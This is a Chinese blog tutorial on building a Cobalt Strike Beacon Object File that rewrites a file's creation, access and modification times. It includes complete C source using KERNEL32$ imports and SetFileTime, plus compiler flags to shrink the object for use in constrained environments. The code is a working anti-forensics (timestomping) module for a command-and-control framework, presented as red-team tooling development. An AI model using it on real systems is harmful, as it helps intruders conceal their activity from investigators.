
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/bktown/p/18658793/bof-writingmodification-time-stamp-zgai05" title="发布于 2025-01-08 02:12">
    <span role="heading" aria-level="2">BOF编写-修改时间戳</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h2 id="模板配置">模板配置</h2>
<p>跟着网上的教程使用<a href="https://github.com/evilashz/Visual-Studio-BOF-template" target="_blank" rel="noopener nofollow">evilashz师傅的模板</a>，下载模板解压至vs的模板目录：</p>
<pre><code class="language-bash">%UserProfile%\Documents\Visual Studio 2022\Templates\ProjectTemplates
</code></pre>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021057215-1358478105.png" alt="image" loading="lazy">​</p>
<p>创建新项目选择刚刚新增的类型：<code>Beacon Object File</code>​。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021059852-432000355.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h2 id="环境适配">环境适配</h2>
<p>生成时报错，我使用的是2022版本的，模板有点老了他这里的是vs2019。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021101559-838614641.png" alt="image" loading="lazy">​</p>
<p>根据底下的提示从<code>项目</code>​ -&gt; <code>重定目标解决方案</code>​， 接着确定更新即可</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021102418-1018587460.png" alt="image" loading="lazy">​</p>
<p>但是一进来模板会报错没有引入库,  干脆就用最小测试代码：将 <code>Source.cpp</code>​重名为<code>Source.c</code>​并修改为如下：</p>
<pre><code class="language-rust">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include "beacon.h"
void go(char* buff, int len) {
	BeaconPrintf(CALLBACK_OUTPUT, "Hello BOF");
}
</code></pre>
<p>‍</p>
<h2 id="编译配置">编译配置</h2>
<p>在上方的生成中勾选BOF配置， 配置管理器的编译环境也一样的，就可以生成64位版本的。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021103207-731008455.png" alt="image" loading="lazy">​</p>
<p>但最好还是使用批生成同时生成32位和64位版本：<code>生成</code>​ -&gt;<code> 批生成</code>​ 在BOF那两项勾选<code>Win32</code>​和<code>x64</code>​。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021105371-91105092.png" alt="image" loading="lazy">​</p>
<p>创建项目时没有勾选<code>将解决方案和项目放在同一目录下</code>​，那么生成的<code>.obj</code>​文件（编译未链接的目标文件）就在<code>/bin/BOF</code>​中。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021113448-1092886392.png" alt="image" loading="lazy">​</p>
<p>测试如果用cs的话可以使用<code>inline-execute E:\TARGET\timestamp.obj</code>​。我这里执行成功但发现有乱码：</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021114531-589786149.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h3 id="乱码问题">乱码问题</h3>
<p>尝试了加上<code>\n</code>​换行来终止字符串刷新缓冲区但是不行，找到使用格式化输出宏的办法，将可变参数展开。比如这里的<code>INFO_FORMAT("Hello BOF");</code>​会被展开成<code>BeaconPrintf(CALLBACK_OUTPUT, "[*] Hello BOF\n");</code>​。</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include "beacon.h"

#define INFO_FORMAT(fmt, ...)    BeaconPrintf(CALLBACK_OUTPUT, "[*] " fmt "\n", ##__VA_ARGS__)

void go(char* buff, int len) {
    INFO_FORMAT("Hello BOF");
}
</code></pre>
<p>原先的内存中可能是这样：<code>"Hello BOF" &lt;未知内存内容&gt;</code>​，但使用宏之后就是这样的：<code>"[*] Hello BOF\n" &lt;确定的字符串终止&gt;</code>​，最后测试也没有乱码了。</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021115982-2093782952.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h2 id="功能实现">功能实现</h2>
<p>实现一个修改文件时间戳的功能， BOF不能直接调用Windows API， 而是通过cs提供的函数来交互。但我这里并不是为cs编写，所以要使用Windows API函数的话，首先需要进行声明：</p>
<h3 id="windows-api声明">Windows API声明</h3>
<p>要修改文件时间戳， 就要用到<code>SetFileTime</code>​。它用于设置文件的创建时间、访问时间和修改时间。文档中原型如下：</p>
<pre><code class="language-c">BOOL SetFileTime(
  [in]           HANDLE         hFile,
  [in, optional] const FILETIME *lpCreationTime,
  [in, optional] const FILETIME *lpLastAccessTime,
  [in, optional] const FILETIME *lpLastWriteTime
);
</code></pre>
<p>‍</p>
<ul>
<li>hFile: 文件句柄，必须有FILE_WRITE_ATTRIBUTES访问权限</li>
<li>lpCreationTime: 文件的创建时间</li>
<li>lpLastAccessTime: 文件的最后访问时间</li>
<li>lpLastWriteTime: 文件的最后修改时间</li>
</ul>
<p>那么在bof的声明中要注意这个函数是属于哪个dll， 比如这里是<code>kernel32.dll</code>​的话那要定义和调用它时就写成<code>KERNEL32$SetFileTime</code>​，完整如下：</p>
<pre><code class="language-c">DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetFileTime(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
</code></pre>
<p>cs使用这种前缀可以让BOF直接调用DLL中的原生函数， 就不需要再在导入表中声明了，这样也可以缩小BOF体积。类似的使用<code>CreateFileA</code>​来创建或打开文件时， 其原型如下：</p>
<pre><code class="language-c">HANDLE CreateFileA(
  [in]           LPCSTR                lpFileName, 			  // 文件名
  [in]           DWORD                 dwDesiredAccess,  	  // 访问模式
  [in]           DWORD                 dwShareMode,			  // 共享模式
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,  // 安全描述符
  [in]           DWORD                 dwCreationDisposition, // 创建方式
  [in]           DWORD                 dwFlagsAndAttributes,  // 文件属性
  [in, optional] HANDLE                hTemplateFile		  // 模板文件句柄
);
</code></pre>
<p>BOF中声明则如下：</p>
<pre><code class="language-c">DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
</code></pre>
<p>以及其他要用到的api可以这样声明：</p>
<pre><code class="language-c">// 其他必要的API
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE); // 关闭一个内核对象（如文件）的句柄
DECLSPEC_IMPORT VOID WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME); // 获取当前系统时间（UTC时间）
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SystemTimeToFileTime(LPSYSTEMTIME, LPFILETIME); // 将SYSTEMTIME结构转换为FILETIME结构。
</code></pre>
<p>‍</p>
<h3 id="参数处理">参数处理</h3>
<p>BOF的入口函数就是这里的go， <code>inline-execute</code>​执行BOF时先调用这个。其中先定义并初始化一个解析器来解析传入的参数，<code>timestamp</code>​这个至少也是要一个参数路径的，先从一个来：</p>
<pre><code class="language-c">void go(char* buff, int len) {
    datap parser;
    char* filepath;

    // 解析Beacon传入的参数
    BeaconDataParse(&amp;parser, buff, len);
    filepath = BeaconDataExtract(&amp;parser, NULL);

    // 参数验证
    if (!filepath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] please provide file path");
        return;
    }
}
</code></pre>
<p>那解析多个参数呢， 一样的：</p>
<pre><code class="language-c">BeaconDataParse(&amp;parser, buff, len);
sourceFile = BeaconDataExtract(&amp;parser, NULL);
targetFile = BeaconDataExtract(&amp;parser, NULL);

if (!sourceFile || !targetFile) {
	BeaconPrintf(CALLBACK_ERROR, "[!] Error: Two file paths required\n");
    BeaconPrintf(CALLBACK_ERROR, "[-] Usage: inline-execute timestamp.o \"source_file\" \"target_file\"\n");
    return;
}

BeaconPrintf(CALLBACK_OUTPUT, "[-] Source: %s\n", sourceFile);
BeaconPrintf(CALLBACK_OUTPUT, "[-] Target: %s\n", targetFile);
</code></pre>
<p>‍</p>
<h3 id="时间处理">时间处理</h3>
<p>接着继续，获取系统时间然后修改成我们希望的时间，比如<code>2020年1月1日 00:00:00</code>​。然后把他转换为文件时间格式：</p>
<pre><code class="language-c">SYSTEMTIME st;
FILETIME ft;
KERNEL32$GetSystemTime(&amp;st);

st.wYear = 2020;
st.wMonth = 1;
st.wDay = 1;
st.wHour = 0;
st.wMinute = 0;
st.wSecond = 0;

KERNEL32$SystemTimeToFileTime(&amp;st, &amp;ft);
</code></pre>
<p>‍</p>
<h3 id="文件操作">文件操作</h3>
<p>准备好了要修改的时间后就尝试打开文件获取句柄：</p>
<pre><code class="language-c">HANDLE hFile = KERNEL32$CreateFileA(
    filepath,                         			// 文件路径
    FILE_WRITE_ATTRIBUTES,           			// 只需要写属性权限
    FILE_SHARE_READ | FILE_SHARE_WRITE, 		// 允许其他进程读写
    NULL,                            			// 默认安全属性
    OPEN_EXISTING,                   			// 只打开已存在的文件
    FILE_ATTRIBUTE_NORMAL,          		    // 使用标准属性
    NULL                            			// 不使用模板
);

if (hFile == INVALID_HANDLE_VALUE) {
    BeaconPrintf(CALLBACK_ERROR, "[-] can not open file: %s", filepath);
    return;
}
</code></pre>
<p>‍</p>
<h3 id="时间戳修改">时间戳修改</h3>
<p>最后使用<code>SetFileTime</code>​修改三个时间属性：创建时间、访问时间、修改时间。结束后关闭句柄。</p>
<pre><code class="language-c">if (!KERNEL32$SetFileTime(hFile, &amp;ft, &amp;ft, &amp;ft)) {
    BeaconPrintf(CALLBACK_ERROR, "[-] failed to change timestamp");
} else {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] success: %s", filepath);
}

KERNEL32$CloseHandle(hFile);
</code></pre>
<p>这样就简单完成了修改一个文件时间戳的功能，完整代码如下：</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;Windows.h&gt;
#include "beacon.h"

// 声明Windows API函数
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SetFileTime(HANDLE, const FILETIME*, const FILETIME*, const FILETIME*);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT VOID WINAPI KERNEL32$GetSystemTime(LPSYSTEMTIME);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$SystemTimeToFileTime(LPSYSTEMTIME, LPFILETIME);

void go(char* buff, int len) {
    datap parser;
    char* filepath;

    BeaconDataParse(&amp;parser, buff, len);
    filepath = BeaconDataExtract(&amp;parser, NULL);

    if (!filepath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] please provide file path");
        return;
    }

    SYSTEMTIME st;
    FILETIME ft;
    KERNEL32$GetSystemTime(&amp;st);

    st.wYear = 2020;
    st.wMonth = 1;
    st.wDay = 1;
    st.wHour = 0;
    st.wMinute = 0;
    st.wSecond = 0;

    KERNEL32$SystemTimeToFileTime(&amp;st, &amp;ft);

    HANDLE hFile = KERNEL32$CreateFileA(
        filepath,
        FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] can not open file: %s", filepath);
        return;
    }

    if (!KERNEL32$SetFileTime(hFile, &amp;ft, &amp;ft, &amp;ft)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] failed to change timestamp");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] sunccess: %s", filepath);
    }

    KERNEL32$CloseHandle(hFile);
}
</code></pre>
<p>‍</p>
<h2 id="测试">测试</h2>
<p>编译还是同上使用批生成，我这里测试的可以成功修改：</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021129263-1358463062.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h2 id="优化编译">优化编译</h2>
<p>为了更好的在苛刻环境下使用，我想继续压缩体积，找到的参数以及解释如下：</p>
<ul>
<li>-Os: 优化大小（比-O2生成更小的代码）</li>
<li>-fno-asynchronous-unwind-tables: 禁用异常展开表</li>
<li>-fno-ident: 删除编译器版本信息</li>
<li>-fpack-struct=8: 结构体8字节对齐</li>
<li>-falign-functions=1: 函数1字节对齐</li>
<li>-s: 删除符号表</li>
<li>-ffunction-sections: 每个函数放入单独的段</li>
<li>-fdata-sections: 每个数据项放入单独的段</li>
<li>-fno-exceptions: 禁用异常处理</li>
<li>-fno-stack-protector: 禁用栈保护</li>
<li>-mno-stack-arg-probe: 禁用栈探测</li>
</ul>
<p>64位使用的编译命令如下:</p>
<pre><code class="language-bash">x86_64-w64-mingw32-gcc-8.1.0.exe -c .\Source.c -o timestamp.o -Os -fno-asynchronous-unwind-tables -fno-ident -fpack-struct=8 -falign-functions=1 -s -ffunction-sections -fdata-sections -fno-exceptions -fno-stack-protector -mno-stack-arg-probe
</code></pre>
<p>针对于编译32位版本的命令（ 如果没有就用批生成， 重命名即可）:</p>
<pre><code class="language-c">i686-w64-mingw32-gcc-8.1.0.exe -c .\Source.c -o timestamp.x86.o -Os -fno-asynchronous-unwind-tables -fno-ident -fpack-struct=8 -falign-functions=1 -s -ffunction-sections -fdata-sections -fno-exceptions -fno-stack-protector -mno-stack-arg-probe
</code></pre>
<blockquote>
<p>注：这里生成的是.o而不是.obj只是自己的需求为了统一一下，obj是Windows平台的默认目标文件扩展名，而.o是Unix/Linux平台的扩展名。它们本质和功能上是一样的，只是命名习惯不同。</p>
</blockquote>
<p>‍</p>
<h2 id="最后">最后</h2>
<p>这里只是简单的示例，要使用最好要有一个锚定文件，以他的时间作为目标来修改。细节不赘述，详细请跳转<a href="https://github.com/BKLockly/BOF-Timestamp" target="_blank" rel="noopener nofollow">Github</a>。最终版本的使用测试如下:</p>
<p>​<img src="https://img2023.cnblogs.com/blog/3038812/202501/3038812-20250108021136553-589312315.png" alt="image" loading="lazy">​</p>
<p>‍</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://github.com/evilashz/Visual-Studio-BOF-template" target="_blank" rel="noopener nofollow">Visual-Studio-BOF-template</a></li>
<li><a href="https://mp.weixin.qq.com/s/-1jmT3NqAUfgVuTt-hKAYg" target="_blank" rel="noopener nofollow">【武器开发】| 开发你的第一个BOF</a></li>
<li><a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html" target="_blank" rel="noopener nofollow">GCC Optimization Options</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfiletime" target="_blank" rel="noopener nofollow">Windows API</a></li>
</ul>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.35605312910185183" data-date-created="BlogServer.Application.Dto.BlogPost.BlogPostDto" data-date-updated="2025-01-08 02:14">2025-01-08 02:12</span>&nbsp;
<a href="https://www.cnblogs.com/bktown">lockly</a>&nbsp;
阅读(<span id="post_view_count">17</span>)&nbsp;
评论(<span id="post_comment_count">0</span>)&nbsp;
<a href="https://i.cnblogs.com/EditPosts.aspx?postid=18658793" rel="nofollow">编辑</a>&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(18658793);return false;">收藏</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '18658793', targetLink: 'https://www.cnblogs.com/bktown/p/18658793/bof-writingmodification-time-stamp-zgai05', title: 'BOF编写-修改时间戳' })">举报</a>
</div>
        